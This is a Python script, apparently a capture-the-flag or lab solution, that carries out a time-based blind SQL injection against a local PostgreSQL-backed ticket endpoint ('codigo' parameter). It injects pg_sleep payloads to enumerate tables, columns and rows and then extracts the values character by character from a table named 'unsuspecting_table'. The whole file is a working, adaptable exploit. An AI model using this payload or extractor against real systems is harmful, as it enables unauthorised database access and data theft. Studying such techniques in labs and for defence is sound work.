import time
import requests

url = 'http://localhost/api/bilhete'
chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{}_"
SLEEP = 2
THRESHOLD = 1.5


def ask(condition):
    payload = (
        f"A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep("
        f"CASE WHEN {condition} THEN {SLEEP} ELSE 0 END))a)--"
    )
    t0 = time.time()
    requests.get(url, params={"codigo": payload})
    return time.time() - t0 >= THRESHOLD


def extract_string(query):
    length = 1
    while not ask(f"(SELECT LENGTH({query}))={length}"):
        length += 1
    result = ""
    for i in range(1, length + 1):
        for c in chars:
            if ask(f"(SELECT SUBSTRING({query},{i},1))='{c}'"):
                result += c
                break
    return result


# Count tables
num_tables = 1
while not ask(f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')={num_tables}"):
    num_tables += 1
print(f"There are {num_tables} tables")

# Extract table names
table_names = []
for offset in range(num_tables):
    name = extract_string(f"(SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1 OFFSET {offset})")
    print(f"Table at offset {offset}: {name}")
    table_names.append(name)

# Lets assume the unsuspecting_table is the one we want to extract data from, since it doesn't look like metadata and has a nice name :D
target_table = "unsuspecting_table"
print(f"\nTarget table: {target_table}")

# Count columns
num_columns = 1
while not ask(f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{target_table}')={num_columns}"):
    num_columns += 1
print(f"There are {num_columns} columns in {target_table}")

# Extract column names
column_names = []
for offset in range(num_columns):
    name = extract_string(f"(SELECT column_name FROM information_schema.columns WHERE table_name='{target_table}' ORDER BY column_name LIMIT 1 OFFSET {offset})")
    print(f"Column at offset {offset}: {name}")
    column_names.append(name)

# Find the non-metadata column (not id, not descricao)
target_column = "juice"
print(f"\nTarget column: {target_column}")

# Count rows
num_rows = 1
while not ask(f"(SELECT COUNT(*) FROM {target_table})={num_rows}"):
    num_rows += 1
print(f"There are {num_rows} rows in {target_table}")

# Extract values
for offset in range(num_rows):
    value = extract_string(f"(SELECT {target_column} FROM {target_table} ORDER BY {target_column} LIMIT 1 OFFSET {offset})")
    print(f"Value at offset {offset}: {value}")
